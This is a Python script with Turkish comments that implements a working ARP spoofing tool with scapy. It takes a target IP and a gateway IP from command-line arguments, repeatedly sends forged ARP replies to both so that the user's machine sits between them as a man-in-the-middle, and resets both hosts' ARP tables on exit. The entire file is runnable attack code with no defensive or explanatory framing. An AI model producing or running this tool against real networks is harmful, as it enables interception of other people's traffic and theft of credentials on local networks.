"""chatgpt kullanılarak argparse var."""

import scapy.all as scapy
import time
import argparse

# Belirtilen IP adresinin MAC adresini almak için fonksiyon
def mac_adresi_getir(ip):
    arp_istek_paket = scapy.ARP(pdst=ip)
    broadcast_paket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    birlesik_paket = broadcast_paket / arp_istek_paket
    cevap_liste = scapy.srp(birlesik_paket, timeout=1, verbose=False)[0]  # 1. elemanını almak için
    return cevap_liste[0][1].hwsrc  # bu kullanım scapy sayesinde yapıldı

# Hedef IP'yi pozisyonel IP'ye yönlendiren ARP paketi gönderme fonksiyonu
def arp_pozisyon(hedef_ip, pozisyonel_ip):
    hedef_mac = mac_adresi_getir(hedef_ip)
    arp_cevap = scapy.ARP(op=2, pdst=hedef_ip, hwdst=hedef_mac, psrc=pozisyonel_ip)
    scapy.send(arp_cevap, verbose=False)

# Ağdaki pozisyonu resetlemek için fonksiyon
def reset_yapma(karistirilmis_ip, gateway_ip):
    karistirilmis_mac = mac_adresi_getir(karistirilmis_ip)
    gateway_mac = mac_adresi_getir(gateway_ip)
    arp_cevap = scapy.ARP(op=2, pdst=karistirilmis_ip, hwdst=karistirilmis_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_cevap, verbose=False, count=6)

# Kullanıcıdan hedef ve gateway IP adreslerini almak için fonksiyon
def kullanici_input_getir():
    parser = argparse.ArgumentParser(description="ARP Spoofing Aracı")
    parser.add_argument("-t", "--target", dest="hedef_ip", help="Hedef IP adresini giriniz.", required=True)
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP adresini giriniz.", required=True)

    args = parser.parse_args()

    return args

# Kullanıcıdan alınan IP adreslerini işleme alma
kullanici_ipleri = kullanici_input_getir()
kullanici_hedef_ip = kullanici_ipleri.hedef_ip
gateway_hedef_ip = kullanici_ipleri.gateway_ip

paket_sayac = 0

try:
    while True:
        arp_pozisyon(kullanici_hedef_ip, gateway_hedef_ip)
        arp_pozisyon(gateway_hedef_ip, kullanici_hedef_ip)
        paket_sayac += 2
        print("\rPaket gönderiliyor: " + str(paket_sayac), end="")  # Aynı satırda kalmasını sağlar
        time.sleep(3)
except KeyboardInterrupt:
    print("\nÇıkış ve Reset Atıldı.")
    reset_yapma(kullanici_hedef_ip, gateway_hedef_ip)
    reset_yapma(gateway_hedef_ip, kullanici_hedef_ip)
